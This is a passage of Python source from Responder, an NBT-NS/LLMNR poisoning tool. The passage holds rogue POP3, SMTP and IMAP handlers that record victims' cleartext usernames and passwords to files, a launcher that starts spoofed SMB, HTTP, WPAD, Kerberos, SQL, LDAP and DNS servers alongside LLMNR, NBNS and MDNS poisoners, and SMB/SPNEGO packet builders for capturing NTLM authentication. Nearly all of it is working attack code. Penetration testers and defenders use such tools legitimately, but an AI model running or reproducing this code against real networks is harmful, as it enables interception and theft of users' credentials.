             Outfile = os.path.join(ResponderPATH,"POP3-Clear-Text-Password-"+self.client_address[0]+".txt")
             WriteData(Outfile,User+":"+Pass, User+":"+Pass)
             print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
             logging.warning("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
             t = POPOKPacket()
             self.request.send(str(t))
             data = self.request.recv(1024)
          else :
             t = POPOKPacket()
             self.request.send(str(t))
             data = self.request.recv(1024)
        except Exception:
           pass

##################################################################################
#ESMTP Stuff
##################################################################################
from SMTPPackets import *

#ESMTP server class.
class ESMTP(BaseRequestHandler):

    def handle(self):
        try:
          self.request.send(str(SMTPGreating()))
          data = self.request.recv(1024)
          if data[0:4] == "EHLO":
             self.request.send(str(SMTPAUTH()))
             data = self.request.recv(1024)
          if data[0:4] == "AUTH":
             self.request.send(str(SMTPAUTH1()))
             data = self.request.recv(1024)
             if data:
                Username = b64decode(data[:len(data)-2])
                self.request.send(str(SMTPAUTH2()))
                data = self.request.recv(1024)
                if data:
                   Password = b64decode(data[:len(data)-2])
                   Outfile = os.path.join(ResponderPATH,"SMTP-Clear-Text-Password-"+self.client_address[0]+".txt")
                   WriteData(Outfile,Username+":"+Password, Username+":"+Password)
                   print "[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password)
                   logging.warning("[+]SMTP Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],Username,Password))

        except Exception:
           pass

##################################################################################
#IMAP4 Stuff
##################################################################################
from IMAPPackets import *

#ESMTP server class.
class IMAP(BaseRequestHandler):

    def handle(self):
        try:
          self.request.send(str(IMAPGreating()))
          data = self.request.recv(1024)
          if data[5:15] == "CAPABILITY":
             RequestTag = data[0:4]
             self.request.send(str(IMAPCapability()))
             self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
             data = self.request.recv(1024)
          if data[5:10] == "LOGIN":
             Credentials = data[10:].strip()
             Outfile = os.path.join(ResponderPATH,"IMAP-Clear-Text-Password-"+self.client_address[0]+".txt")
             WriteData(Outfile,Credentials, Credentials)
             print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
             logging.warning('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
             self.request.send(str(ditchthisconnection()))
             data = self.request.recv(1024)

        except Exception:
           pass
##################################################################################
#Loading the servers
##################################################################################

#Function name self-explanatory
def Is_HTTP_On(on_off):
    if on_off == "ON":
       return thread.start_new(serve_thread_tcp,('', 80,HTTP))
    if on_off == "OFF":
       return False

#Function name self-explanatory
def Is_HTTPS_On(SSL_On_Off):
    if SSL_On_Off == "ON":
       return thread.start_new(serve_thread_SSL,('', 443,DoSSL))
    if SSL_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_WPAD_On(on_off):
    if on_off == True:
       return thread.start_new(serve_thread_tcp,('', 3141,ProxyHandler))
    if on_off == False:
       return False

#Function name self-explanatory
def Is_SMB_On(SMB_On_Off):
    if SMB_On_Off == "ON":
       if LM_On_Off == True:
          return thread.start_new(serve_thread_tcp, ('', 445,SMB1LM)),thread.start_new(serve_thread_tcp,('', 139,SMB1LM))
       else:
          return thread.start_new(serve_thread_tcp, ('', 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
    if SMB_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_Kerberos_On(Krb_On_Off):
    if Krb_On_Off == "ON":
       return thread.start_new(serve_thread_udp,('', 88,KerbUDP)),thread.start_new(serve_thread_tcp,('', 88, KerbTCP))
    if Krb_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_SQL_On(SQL_On_Off):
    if SQL_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 1433,MSSQL))
    if SQL_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_FTP_On(FTP_On_Off):
    if FTP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 21,FTP))
    if FTP_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_POP_On(POP_On_Off):
    if POP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 110,POP))
    if POP_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_LDAP_On(LDAP_On_Off):
    if LDAP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 389,LDAP))
    if LDAP_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_SMTP_On(SMTP_On_Off):
    if SMTP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 25,ESMTP)),thread.start_new(serve_thread_tcp,('', 587,ESMTP))
    if SMTP_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_IMAP_On(IMAP_On_Off):
    if IMAP_On_Off == "ON":
       return thread.start_new(serve_thread_tcp,('', 143,IMAP))
    if IMAP_On_Off == "OFF":
       return False

#Function name self-explanatory
def Is_DNS_On(DNS_On_Off):
    if DNS_On_Off == "ON":
       return thread.start_new(serve_thread_udp,('', 53,DNS)),thread.start_new(serve_thread_tcp,('', 53,DNSTCP))
    if DNS_On_Off == "OFF":
       return False

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
    
    def server_bind(self):
        if OsInterfaceIsSupported(INTERFACE):
           try:
              self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
           except:
              pass
        UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    
    def server_bind(self):
        if OsInterfaceIsSupported(INTERFACE):
           try:
              self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
           except:
              pass
        TCPServer.server_bind(self)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
    
    def server_bind(self):
       MADDR = "224.0.0.251"
       self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
       self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
       Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
       if OsInterfaceIsSupported(INTERFACE):
          try:
             self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
          except:
             pass
       UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
    
    def server_bind(self):
       MADDR = "224.0.0.252"
       self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
       self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
       Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
       if OsInterfaceIsSupported(INTERFACE):
          try:
             self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
          except:
             pass
       UDPServer.server_bind(self)

ThreadingUDPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1


def serve_thread_udp(host, port, handler):
   try:
      if OsInterfaceIsSupported(INTERFACE):
         IP = FindLocalIP(BIND_TO_Interface)
         server = ThreadingUDPServer((IP, port), handler)
         server.serve_forever()
      else:
         server = ThreadingUDPServer((host, port), handler)
         server.serve_forever()
   except:
      print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."

def serve_thread_udp_MDNS(host, port, handler):
   try:
      server = ThreadingUDPMDNSServer((host, port), handler)
      server.serve_forever()
   except:
      print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."

def serve_thread_udp_LLMNR(host, port, handler):
   try:
      server = ThreadingUDPLLMNRServer((host, port), handler)
      server.serve_forever()
   except:
      print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."

def serve_thread_tcp(host, port, handler):
   try:
      if OsInterfaceIsSupported(INTERFACE):
         IP = FindLocalIP(BIND_TO_Interface)
         server = ThreadingTCPServer((IP, port), handler)
         server.serve_forever()
      else:
         server = ThreadingTCPServer((host, port), handler)
         server.serve_forever()
   except:
      print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."

def serve_thread_SSL(host, port, handler):
   try:
      if OsInterfaceIsSupported(INTERFACE):
         IP = FindLocalIP(BIND_TO_Interface)
         server = SSlSock((IP, port), handler)
         server.serve_forever()
      else:
         server = SSlSock((host, port), handler)
         server.serve_forever()
   except:
      print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root), no other servers are running and the correct network interface is set in Responder.conf."

def main():
    try:
      num_thrd = 1
      Is_FTP_On(FTP_On_Off)
      Is_HTTP_On(On_Off)
      Is_HTTPS_On(SSL_On_Off)
      Is_WPAD_On(WPAD_On_Off)
      Is_Kerberos_On(Krb_On_Off)
      Is_SMB_On(SMB_On_Off)
      Is_SQL_On(SQL_On_Off)
      Is_LDAP_On(LDAP_On_Off)
      Is_DNS_On(DNS_On_Off)
      Is_POP_On(POP_On_Off)
      Is_SMTP_On(SMTP_On_Off)
      Is_IMAP_On(IMAP_On_Off)
      #Browser listener loaded by default
      thread.start_new(serve_thread_udp,('', 138,Browser))
      ## Poisoner loaded by default, it's the purpose of this tool...
      thread.start_new(serve_thread_udp_MDNS,('', 5353,MDNS))   #MDNS
      thread.start_new(serve_thread_udp,('', 88, KerbUDP))
      thread.start_new(serve_thread_udp,('', 137,NB))           #NBNS
      thread.start_new(serve_thread_udp_LLMNR,('', 5355, LLMNR)) #LLMNR
      while num_thrd > 0:
         time.sleep(1)
    except KeyboardInterrupt:
      exit()

if __name__ == '__main__':
    try:
        main()
    except:
        raise


########NEW FILE########
__FILENAME__ = SMBPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#Calculate total SMB packet len.
def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

#Set MID SMB Header field.
def midcalc(data):
    pack=data[34:36]
    return pack

#Set UID SMB Header field.
def uidcalc(data):
    pack=data[32:34]
    return pack

#Set PID SMB Header field.
def pidcalc(data):
    pack=data[30:32]
    return pack

#Set TID SMB Header field.
def tidcalc(data):
    pack=data[28:30]
    return pack


##################################################################################
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("errorcode", "\x00\x00\x00\x00" ),
        ("flag1", "\x00"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x00\x00"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])
##################################################################################
#SMB Negotiate Answer LM packet.
class SMBNegoAnsLM(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("Maxbuffsize",  "\x04\x41\x00\x00"),
        ("Maxrawbuff",   "\x00\x00\x01\x00"),
        ("Sessionkey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\x3e\x01\x00"),
        ("Systemtime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("Srvtimezone",  "\x2c\x01"),
        ("Keylength",    "\x08"),
        ("Bcc",          "\x10\x00"),
        ("Key",          ""),
        ("Domain",       "SMB"),
        ("DomainNull",   "\x00\x00"),
        ("Server",       "SMB-TOOLKIT"),
        ("ServerNull",   "\x00\x00"),
    ])

    def calculate(self):
        ##Convert first..
        self.fields["Domain"] = self.fields["Domain"].encode('utf-16le')
        self.fields["Server"] = self.fields["Server"].encode('utf-16le')
        ##Then calculate.
        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])+str(self.fields["DomainNull"])+str(self.fields["Server"])+str(self.fields["ServerNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]
##################################################################################
#SMB Negotiate Answer ESS NTLM only packet.
class SMBNegoAns(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("MaxBuffSize",  "\x04\x41\x00\x00"),
        ("MaxRawBuff",   "\x00\x00\x01\x00"),
        ("SessionKey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfd\xf3\x01\x80"),
        ("SystemTime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",  "\xf0\x00"),
        ("KeyLen",    "\x00"),
        ("Bcc",          "\x57\x00"),
        ("Guid",         "\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     "\x60"),
        ("InitContextTokenASNLen",    "\x5b"),
        ("ThisMechASNId",             "\x06"),
        ("ThisMechASNLen",            "\x06"),
        ("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          "\xA0"),
        ("SpNegoTokenASNLen",         "\x51"),
        ("NegTokenASNId",             "\x30"),
        ("NegTokenASNLen",            "\x4f"),
        ("NegTokenTag0ASNId",         "\xA0"),
        ("NegTokenTag0ASNLen",        "\x30"),
        ("NegThisMechASNId",          "\x30"),
        ("NegThisMechASNLen",         "\x2e"),
        ("NegThisMech4ASNId",         "\x06"),
        ("NegThisMech4ASNLen",        "\x09"),
        ("NegThisMech4ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         "\xA3"),
        ("NegTokenTag3ASNLen",        "\x1b"),
        ("NegHintASNId",              "\x30"),
        ("NegHintASNLen",             "\x19"),
        ("NegHintTag0ASNId",          "\xa0"),
        ("NegHintTag0ASNLen",         "\x17"),
        ("NegHintFinalASNId",         "\x1b"), 
        ("NegHintFinalASNLen",        "\x15"),
        ("NegHintFinalASNStr",        "server2008$@SMB.LOCAL"),
    ])

    def calculate(self):

        CompleteBCCLen1 =  str(self.fields["Guid"])+str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])

        Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

################################################################################
#SMB Negotiate Answer ESS NTLM and Kerberos packet.
class SMBNegoKerbAns(Packet):
    fields = OrderedDict([
        ("Wordcount",                "\x11"),
        ("Dialect",                  ""),
        ("Securitymode",             "\x03"),
        ("MaxMpx",                   "\x32\x00"),
        ("MaxVc",                    "\x01\x00"),
        ("MaxBuffSize",              "\x04\x41\x00\x00"),
        ("MaxRawBuff",               "\x00\x00\x01\x00"),
        ("SessionKey",               "\x00\x00\x00\x00"),
        ("Capabilities",             "\xfd\xf3\x01\x80"),
        ("SystemTime",               "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",               "\xf0\x00"),
        ("KeyLen",                    "\x00"),
        ("Bcc",                       "\x57\x00"),
        ("Guid",                      "\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     "\x60"),
        ("InitContextTokenASNLen",    "\x5b"),
        ("ThisMechASNId",             "\x06"),
        ("ThisMechASNLen",            "\x06"),
        ("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          "\xA0"),
        ("SpNegoTokenASNLen",         "\x51"),
        ("NegTokenASNId",             "\x30"),
        ("NegTokenASNLen",            "\x4f"),
        ("NegTokenTag0ASNId",         "\xA0"),
        ("NegTokenTag0ASNLen",        "\x30"),
        ("NegThisMechASNId",          "\x30"),
        ("NegThisMechASNLen",         "\x2e"),
        ("NegThisMech1ASNId",         "\x06"),
        ("NegThisMech1ASNLen",        "\x09"),
        ("NegThisMech1ASNStr",        "\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
        ("NegThisMech2ASNId",         "\x06"),
        ("NegThisMech2ASNLen",        "\x09"),
        ("NegThisMech2ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
        ("NegThisMech3ASNId",         "\x06"),
        ("NegThisMech3ASNLen",        "\x0a"),
        ("NegThisMech3ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
        ("NegThisMech4ASNId",         "\x06"),
        ("NegThisMech4ASNLen",        "\x09"),
        ("NegThisMech4ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         "\xA3"),
        ("NegTokenTag3ASNLen",        "\x1b"),
        ("NegHintASNId",              "\x30"),
        ("NegHintASNLen",             "\x19"),
        ("NegHintTag0ASNId",          "\xa0"),
        ("NegHintTag0ASNLen",         "\x17"),
        ("NegHintFinalASNId",         "\x1b"), 
        ("NegHintFinalASNLen",        "\x15"),
        ("NegHintFinalASNStr",        "server2008$@SMB.LOCAL"),
    ])

    def calculate(self):

        CompleteBCCLen1 =  str(self.fields["Guid"])+str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])

        Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech1ASNStr"])))
        self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech2ASNStr"])))
        self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech3ASNStr"])))
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))
################################################################################
class SMBSession1Data(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x04"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("Andxoffset",            "\x5f\x01"),
        ("Action",                "\x00\x00"),
        ("SecBlobLen",            "\xea\x00"),
        ("Bcc",                   "\x34\x01"),
        ("ChoiceTagASNId",        "\xa1"), 
        ("ChoiceTagASNLenOfLen",  "\x81"), 
        ("ChoiceTagASNIdLen",     "\x00"),
        ("NegTokenTagASNId",      "\x30"),
        ("NegTokenTagASNLenOfLen","\x81"),
        ("NegTokenTagASNIdLen",   "\x00"),
        ("Tag0ASNId",             "\xA0"),
        ("Tag0ASNIdLen",          "\x03"),
        ("NegoStateASNId",        "\x0A"),
        ("NegoStateASNLen",       "\x01"),
        ("NegoStateASNValue",     "\x01"),
        ("Tag1ASNId",             "\xA1"),
        ("Tag1ASNIdLen",          "\x0c"),
        ("Tag1ASNId2",            "\x06"),
        ("Tag1ASNId2Len",         "\x0A"),
        ("Tag1ASNId2Str",         "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("Tag2ASNId",             "\xA2"),
        ("Tag2ASNIdLenOfLen",     "\x81"),
        ("Tag2ASNIdLen",          "\xED"),
